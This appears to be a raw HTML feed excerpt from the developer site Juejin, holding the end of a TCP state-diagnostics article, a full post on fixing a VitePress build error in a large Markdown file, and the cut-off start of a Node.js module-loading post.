close_wait=$(ss -ant state close-wait | grep -c -v State)
<span class="hljs-keyword">if</span> [ <span class="hljs-variable">$close_wait</span> -gt 100 ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"⚠️  警告: CLOSE-WAIT 过多(<span class="hljs-variable">$close_wait</span>)，可能存在连接泄漏"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"   排查方法:"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"   1. ss -antp state close-wait"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"   2. 检查对应应用的连接关闭逻辑"</span>
<span class="hljs-keyword">fi</span>

time_wait=$(ss -ant state time-wait | grep -c -v State)
<span class="hljs-keyword">if</span> [ <span class="hljs-variable">$time_wait</span> -gt 10000 ]; <span class="hljs-keyword">then</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"⚠️  警告: TIME-WAIT 过多(<span class="hljs-variable">$time_wait</span>)，可能影响新连接"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"   优化建议:"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"   1. sysctl net.ipv4.tcp_tw_reuse=1"</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"   2. sysctl net.ipv4.tcp_max_tw_buckets=2000000"</span>
<span class="hljs-keyword">fi</span>
</code></pre>
<hr/>
<h2 data-id="heading-17"><strong>状态诊断与调优</strong></h2>
<h3 data-id="heading-18"><strong>常见问题及解决</strong></h3>
<h4 data-id="heading-19"><strong>问题1：大量 TIME-WAIT</strong></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 原因：短连接过多</span>
<span class="hljs-comment"># 解决：</span>
sysctl -w net.ipv4.tcp_tw_reuse=1      <span class="hljs-comment"># 重用</span>
sysctl -w net.ipv4.tcp_tw_recycle=1    <span class="hljs-comment"># 回收（NAT环境慎用）</span>
sysctl -w net.ipv4.tcp_max_tw_buckets=2000000
</code></pre>
<h4 data-id="heading-20"><strong>问题2：大量 CLOSE-WAIT</strong></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 原因：应用未正确关闭连接</span>
<span class="hljs-comment"># 排查：</span>
lsof -nP -iTCP -sTCP:CLOSE_WAIT
<span class="hljs-comment"># 或</span>
ss -antp state close-wait
<span class="hljs-comment"># 检查对应进程的代码</span>
</code></pre>
<h4 data-id="heading-21"><strong>问题3：大量 SYN-RECV</strong></h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 原因：可能遭受SYN Flood攻击</span>
<span class="hljs-comment"># 防御：</span>
sysctl -w net.ipv4.tcp_syncookies=1
sysctl -w net.ipv4.tcp_max_syn_backlog=4096
sysctl -w net.ipv4.tcp_synack_retries=2
</code></pre>
<hr/>
<h2 data-id="heading-22"><strong>状态监控工具</strong></h2>
<h3 data-id="heading-23"><strong>实时监控脚本</strong></h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># 实时监控TCP状态变化</span>
watch -n 1 <span class="hljs-string">'
echo "TCP状态实时监控 - $(date)"
echo "----------------------------------------"
ss -ant | awk '</span>\<span class="hljs-string">''</span>NR&gt;1 {count[<span class="hljs-variable">$2</span>]++} END {
    states[<span class="hljs-string">"LISTEN"</span>]=<span class="hljs-string">"监听"</span>;
    states[<span class="hljs-string">"SYN-SENT"</span>]=<span class="hljs-string">"发SYN"</span>;
    states[<span class="hljs-string">"SYN-RECV"</span>]=<span class="hljs-string">"收SYN"</span>;
    states[<span class="hljs-string">"ESTAB"</span>]=<span class="hljs-string">"已连接"</span>;
    states[<span class="hljs-string">"FIN-WAIT-1"</span>]=<span class="hljs-string">"等FIN-ACK"</span>;
    states[<span class="hljs-string">"FIN-WAIT-2"</span>]=<span class="hljs-string">"等对方FIN"</span>;
    states[<span class="hljs-string">"TIME-WAIT"</span>]=<span class="hljs-string">"等2MSL"</span>;
    states[<span class="hljs-string">"CLOSE-WAIT"</span>]=<span class="hljs-string">"等应用关"</span>;
    states[<span class="hljs-string">"LAST-ACK"</span>]=<span class="hljs-string">"等最后ACK"</span>;
    states[<span class="hljs-string">"CLOSING"</span>]=<span class="hljs-string">"同时关闭"</span>;
    <span class="hljs-keyword">for</span>(s <span class="hljs-keyword">in</span> count) {
        <span class="hljs-built_in">printf</span> <span class="hljs-string">"%-12s %6d  %s\n"</span>, s, count[s], states[s]
    }
}<span class="hljs-string">'\'</span><span class="hljs-string">' | sort
'</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VitePress文件构建失败:Element is missing end tag?]]></title>    <link>https://juejin.cn/post/7592637149697130531</link>    <guid>https://juejin.cn/post/7592637149697130531</guid>    <pubDate>2026-01-08T09:45:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592637149697130531" data-draft-id="7592593491861782528" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VitePress文件构建失败:Element is missing end tag?"/> <meta itemprop="keywords" content="VitePress"/> <meta itemprop="datePublished" content="2026-01-08T09:45:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Jaxon1216"/> <meta itemprop="url" content="https://juejin.cn/user/2446894137877289"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VitePress文件构建失败:Element is missing end tag?
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2446894137877289/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Jaxon1216
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:45:37.000Z" title="Thu Jan 08 2026 09:45:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">VitePress 大型 Markdown 文件构建失败问题：Element is missing end tag</h2>
<p>昨晚在我 push 完上一次的 Vue 学习笔记后，习惯性地打开 <a href="https://link.juejin.cn?target=https%3A%2F%2Fnotes.jiangxu.net" target="_blank" title="https://notes.jiangxu.net" ref="nofollow noopener noreferrer">notes.jiangxu.net</a> 查看更新。然而页面并没有如期更新。心里一沉，打开 GitHub 仓库，果然看到了那个刺眼的红色 ❌ —— 部署失败。</p>
<p>切换到 Vercel 的部署日志，映入眼帘的是这样的错误：</p>
<pre><code class="hljs language-bash" lang="bash">✖ building client + server bundles...

build error:!
[vite:vue] [plugin vite:vue] Frontend/Vue/day2-night.md (273:1): 
Element is missing end tag.

SyntaxError: [plugin vite:vue] Frontend/Vue/day2-night.md (273:1): 
Element is missing end tag.
    at createCompilerError (compiler-core.cjs.prod.js:1360:17)
    at emitError (compiler-core.cjs.prod.js:2963:5)
    at Object.onclosetag (compiler-core.cjs.prod.js:2360:13)
</code></pre>
<p>"Element is missing end tag"？我仔细检查了第 273 行，是一个普通的 Markdown 表格，没有任何 HTML 标签。这让我陷入了困惑。</p>
<h3 data-id="heading-1">🔍 漫长的调试之旅</h3>
<p>接下来的一个个小时，我与 Claude Sonnet 进行了多轮对话，尝试了各种可能的解决方案：</p>
<ol>
<li><strong>验证 HTML 标签配对</strong> - 写了脚本检查所有 <code>&lt;details&gt;</code>、<code>&lt;summary&gt;</code> 标签，结果全部配对正确 ✅</li>
<li><strong>检查代码块闭合</strong> - 验证了所有 44 个代码块都正确闭合 ✅</li>
<li><strong>转义 HTML 标签</strong> - 将所有 <code>&lt;script setup&gt;</code> 改为 <code>&amp;lt;script setup&amp;gt;</code> ✅</li>
<li><strong>修复表格格式</strong> - 将双竖线 <code>||</code> 开头的表格改为单竖线 <code>|</code> ✅</li>
<li><strong>更换代码块类型</strong> - 将 <code>vue</code> 改为 <code>html</code> ✅</li>
</ol>
<p>但问题依然存在。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ef3f3c68317e45d69f0fec02e950f88c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF4b24xMjE2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768470337&amp;x-signature=qpJiV2wY2mn%2F9eoQwZe6TwBppCg%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>更诡异的是：</p>
<ul>
<li>删除"问题行"后，错误会移动到更前面的行（273→242→191）</li>
<li>前 272 行单独提取出来可以成功构建</li>
<li>同目录下其他较小的文件都能正常构建</li>
</ul>
<h3 data-id="heading-2">💡 真相大白</h3>
<p>经过 200 多次工具调用后，问题依然没有得到解决。最终我请教了老大，他一眼就看出了问题所在。原来，这是 <strong>VitePress/Vue 编译器在处理复杂 Markdown 文件时的边界情况 Bug</strong>。</p>
<h4 data-id="heading-3">环境信息</h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"vitepress"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^1.6.4"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"@vitejs/plugin-vue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^5.x"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"vue"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"^3.x"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-4">文件对比分析</h4>





































<table><thead><tr><th>文件</th><th>行数</th><th><code>&lt;details&gt;</code></th><th>表格</th><th>代码块</th><th>构建结果</th></tr></thead><tbody><tr><td>day2-morning.md</td><td>418</td><td>0</td><td>0</td><td>9</td><td>✅ 成功</td></tr><tr><td>day2-afternoon.md</td><td>304</td><td>5</td><td>0</td><td>2</td><td>✅ 成功</td></tr><tr><td>day2-night.md</td><td>1580</td><td>22</td><td>55行</td><td>32</td><td>❌ 失败</td></tr></tbody></table>
<p>通过对比发现，失败的文件具有三个特征：</p>
<ol>
<li><strong>文件最大</strong>（1580 行）</li>
<li><strong>HTML 标签最多</strong>（22 个 <code>&lt;details&gt;</code>）</li>
<li><strong>复杂度最高</strong>（表格 + 代码块 + HTML 标签混合）</li>
</ol>
<h4 data-id="heading-5">二分法测试</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 测试前 800 行</span>
✅ 构建成功

<span class="hljs-comment"># 测试前 1200 行  </span>
❌ 构建失败

<span class="hljs-comment"># 测试前 1000 行</span>
✅ 构建成功
</code></pre>
<p><strong>结论</strong>：存在一个隐藏的阈值（约 1000-1200 行），超过后触发 Bug。</p>
<h3 data-id="heading-6">🎯 根本原因</h3>
<p>这不是某一行的语法错误，而是<strong>多个边界情况的累积效应</strong>：</p>
<h4 data-id="heading-7">原因 1：表格中的花括号被误识别</h4>
<p>在 Markdown 表格中使用 <code>return {}</code>，Vue 编译器可能将其误认为模板插值语法 <code>{{ }}</code>。在大文件中，这种误识别会累积，导致编译器状态机错乱。</p>
<p><strong>问题代码</strong>：</p>
<pre><code class="hljs language-kotlin" lang="kotlin">| **暴露** | 自动暴露 | 需要 `<span class="hljs-keyword">return</span> {}` |
</code></pre>
<h4 data-id="heading-8">原因 2：<code>&lt;summary&gt;</code> 标签内的转义 HTML</h4>
<p>在 <code>&lt;summary&gt;</code> 标签内直接使用 <code>&amp;lt;script setup&amp;gt;</code> 这样的转义字符，在某些情况下会让编译器混淆，认为还有未闭合的标签。</p>
<h4 data-id="heading-9">原因 3：<code>&lt;details&gt;</code> 内部格式不规范</h4>
<p>VitePress 的 Markdown 解析器期望 <code>&lt;summary&gt;</code> 标签后有空行，否则在大文件中可能导致解析边界不清。</p>
<h4 data-id="heading-10">触发条件</h4>
<p>当以下因素<strong>同时出现</strong>时触发 Bug：</p>
<pre><code class="hljs language-markdown" lang="markdown">文件大小 &gt; 1000行 
<span class="hljs-bullet">  +</span> HTML标签数量 &gt; 20
<span class="hljs-bullet">  +</span> Markdown表格 &gt; 10
<span class="hljs-bullet">  +</span> 花括号{} 在表格中
  = 编译器进入不稳定状态
</code></pre>
<p>这是典型的<strong>编译器边界情况 Bug</strong>，不是代码错误，而是工具链的缺陷。</p>
<h3 data-id="heading-11">✅ 解决方案-workout</h3>
<h4 data-id="heading-12">修复 1：表格中的花括号加空格</h4>
<p><strong>修改前</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">| <span class="hljs-strong">**暴露**</span> | 自动暴露 | 需要 <span class="hljs-code">`return {}`</span> |
</code></pre>
<p><strong>修改后</strong>：</p>
<pre><code class="hljs language-markdown" lang="markdown">| <span class="hljs-strong">**暴露**</span> | 自动暴露 | 需要 <span class="hljs-code">`return { }`</span> |
</code></pre>
<p>在 <code>{}</code> 之间添加空格，避免被误识别为 Vue 插值。</p>
<h4 data-id="heading-13">修复 2：规范 <code>&lt;details&gt;</code> 格式</h4>
<p>在以下位置添加空行：</p>
<ul>
<li><code>&lt;summary&gt;</code> 标签后</li>
<li>代码块前后</li>
<li><code>&lt;/details&gt;</code> 标签前</li>
</ul>
<p>让 Markdown 解析器更清晰地识别边界。</p>
<h4 data-id="heading-14">修复 3：优化 <code>&lt;summary&gt;</code> 内的 HTML</h4>
<p>使用 <code>&lt;code&gt;</code> 标签包裹转义字符：</p>
<p><strong>修改前</strong>：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">summary</span>&gt;</span>为什么 <span class="hljs-symbol">&amp;lt;</span>script setup<span class="hljs-symbol">&amp;gt;</span> 不能用？<span class="hljs-tag">&lt;/<span class="hljs-name">summary</span>&gt;</span>
</code></pre>
<p><strong>修改后</strong>：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">summary</span>&gt;</span>为什么 <span class="hljs-tag">&lt;<span class="hljs-name">code</span>&gt;</span><span class="hljs-symbol">&amp;lt;</span>script setup<span class="hljs-symbol">&amp;gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">code</span>&gt;</span> 不能用？<span class="hljs-tag">&lt;/<span class="hljs-name">summary</span>&gt;</span>
</code></pre>
<h4 data-id="heading-15">修复 4：拆分大文件（治本方案）</h4>
<p>如果文件超过 800 行，建议拆分为多个子文件：</p>
<pre><code class="hljs language-scss" lang="scss">day2-night<span class="hljs-selector-class">.md</span> (<span class="hljs-number">1580</span>行)
  ↓ 拆分为
day2-night-pinia<span class="hljs-selector-class">.md</span> (<span class="hljs-number">800</span>行)
day2-night-communication<span class="hljs-selector-class">.md</span> (<span class="hljs-number">780</span>行)
</code></pre>
<h3 data-id="heading-16">🔧 预防措施：自动化检查</h3>
<p>为避免类似问题，添加预构建检查脚本：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// scripts/check-html-tags.cjs</span>
<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params">filePath</span>) {
  <span class="hljs-keyword">const</span> content = fs.<span class="hljs-title function_">readFileSync</span>(filePath, <span class="hljs-string">'utf-8'</span>);
  <span class="hljs-keyword">const</span> lines = content.<span class="hljs-title function_">split</span>(<span class="hljs-string">'\n'</span>);
  
  <span class="hljs-keyword">let</span> inCodeBlock = <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">const</span> tagStack = [];
  
  lines.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">line, index</span>) =&gt;</span> {
    <span class="hljs-comment">// 跳过代码块</span>
    <span class="hljs-keyword">if</span> (line.<span class="hljs-title function_">trim</span>().<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">'```'</span>)) {
      inCodeBlock = !inCodeBlock;
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">if</span> (inCodeBlock) <span class="hljs-keyword">return</span>;
    
    <span class="hljs-comment">// 移除反引号内容</span>
    <span class="hljs-keyword">const</span> processedLine = line.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/`[^`]*`/g</span>, <span class="hljs-string">''</span>);
    
    <span class="hljs-comment">// 检查标签配对...</span>
  });
  
  <span class="hljs-keyword">return</span> tagStack.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>;
}
</code></pre>
<p>在 <code>package.json</code> 中配置：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"check:html"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"node scripts/check-html-tags.cjs"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"prebuild"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"npm run check:html"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h3 data-id="heading-17">📊 修复效果</h3>

























<table><thead><tr><th>指标</th><th>修复前</th><th>修复后</th></tr></thead><tbody><tr><td>本地构建</td><td>❌ 失败</td><td>✅ 45s</td></tr><tr><td>Vercel 部署</td><td>❌ 失败</td><td>✅ ~60s</td></tr><tr><td>文件大小</td><td>1580行</td><td>1580行（内容不变）</td></tr></tbody></table>
<p>修复前后文件行数不变，只是调整了格式。</p>
<h3 data-id="heading-18">💡 最佳实践建议</h3>
<h4 data-id="heading-19">文件大小控制</h4>
<ul>
<li>✅ <strong>推荐</strong>：单个 Markdown 文件不超过 800 行</li>
<li>⚠️ <strong>警告</strong>：超过 1000 行需要特别注意格式规范</li>
<li>❌ <strong>避免</strong>：超过 1500 行，强烈建议拆分</li>
</ul>
<h4 data-id="heading-20">格式规范</h4>
<p><strong>✅ 推荐写法</strong>：</p>
<ol>
<li><strong>表格中的花括号</strong>：<code>return { value }</code> （有空格）</li>
<li><strong>details 标签</strong>：summary 后、内容前后、代码块前后都要有空行</li>
<li><strong>summary 中的 HTML</strong>：用 <code>&lt;code&gt;</code> 标签包裹，如 <code>&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;</code></li>
</ol>
<p><strong>❌ 避免写法</strong>：</p>
<ol>
<li><strong>表格中紧密的花括号</strong>：<code>return {}</code> （无空格）</li>
<li><strong>details 无空行</strong>：summary 后直接写内容</li>
<li><strong>summary 中直接转义</strong>：直接使用 <code>&amp;lt;</code> <code>&amp;gt;</code> 不用 code 包裹</li>
</ol>
<h4 data-id="heading-21">混合内容注意事项</h4>
<p>当文件中同时包含以下元素时，需要格外小心：</p>
<ul>
<li>大量 Markdown 表格（&gt; 10 行）</li>
<li>多个 HTML 标签（&gt; 15 个）</li>
<li>多个代码块（&gt; 20 个）</li>
<li>反引号内的特殊字符（<code>{}</code>、<code>&lt;&gt;</code>）</li>
</ul>
<h3 data-id="heading-22">🎯 经验总结</h3>
<h4 data-id="heading-23">关键要点</h4>
<ol>
<li>
<p><strong>工具链不是完美的</strong></p>
<ul>
<li>VitePress/Vue 编译器在处理边界情况时可能出现 Bug</li>
<li>不要假设工具会正确处理所有合法的 Markdown 语法</li>
</ul>
</li>
<li>
<p><strong>累积效应很重要</strong></p>
<ul>
<li>单个"问题"可能不会触发 Bug</li>
<li>多个边界情况组合可能导致编译器崩溃</li>
</ul>
</li>
<li>
<p><strong>调试需要耐心</strong></p>
<ul>
<li>有时问题不在错误提示的那一行</li>
<li>需要系统性地分析和测试</li>
</ul>
</li>
<li>
<p><strong>预防胜于治疗</strong></p>
<ul>
<li>添加自动化检查脚本</li>
<li>建立格式规范并严格遵守</li>
<li>定期审查大文件，及时拆分</li>
</ul>
</li>
</ol>
<h4 data-id="heading-24">写在最后</h4>
<p>这个 Bug 的发现和解决历经了 <strong>200+ 次的调试和测试</strong>，充分体现了大型项目中工具链的复杂性。虽然最终的修复很简单（几个空格和标签调整），但问题的诊断过程却需要对编译原理、Markdown 解析、Vue 模板编译等多方面的理解。</p>
<p>更重要的是，这次经历让我意识到：</p>
<ul>
<li><strong>不要盲目相信工具</strong>：即使是成熟的工具链也可能有 Bug</li>
<li><strong>保持代码整洁</strong>：良好的格式规范不仅提高可读性，还能避免触发工具的边界情况</li>
<li><strong>建立反馈机制</strong>：遇到问题要及时记录和分享，帮助社区改进</li>
</ul>
<p>如果你也遇到了类似的问题，希望这篇文章能帮你快速定位和解决。如果你有更好的解决方案或见解，欢迎讨论交流！</p>
<hr/>
<p><strong>作者</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Fjiangxu.net" target="_blank" title="https://jiangxu.net" ref="nofollow noopener noreferrer">jiangxu.net</a><br/>
<strong>日期</strong>：2026-01-08<br/>
<strong>标签</strong>：<code>VitePress</code> <code>Vue</code> <code>Markdown</code> <code>编译器Bug</code> <code>调试经验</code></p>
<blockquote>
<p>写作不易，如果这篇文章对你有帮助，欢迎分享给更多的人 ⭐</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js 模块加载 - 4 - CJS 和 ESM 互操作避坑清单]]></title>    <link>https://juejin.cn/post/7592615536384999458</link>    <guid>https://juejin.cn/post/7592615536384999458</guid>    <pubDate>2026-01-08T09:47:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592615536384999458" data-draft-id="7592637149697097763" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js 模块加载 - 4 - CJS 和 ESM 互操作避坑清单"/> <meta itemprop="keywords" content="前端,Node.js"/> <meta itemprop="datePublished" content="2026-01-08T09:47:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="之恒君"/> <meta itemprop="url" content="https://juejin.cn/user/2261046026312318"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js 模块加载 - 4 - CJS 和 ESM 互操作避坑清单
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2261046026312318/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    之恒君
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:47:35.000Z" title="Thu Jan 08 2026 09:47:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
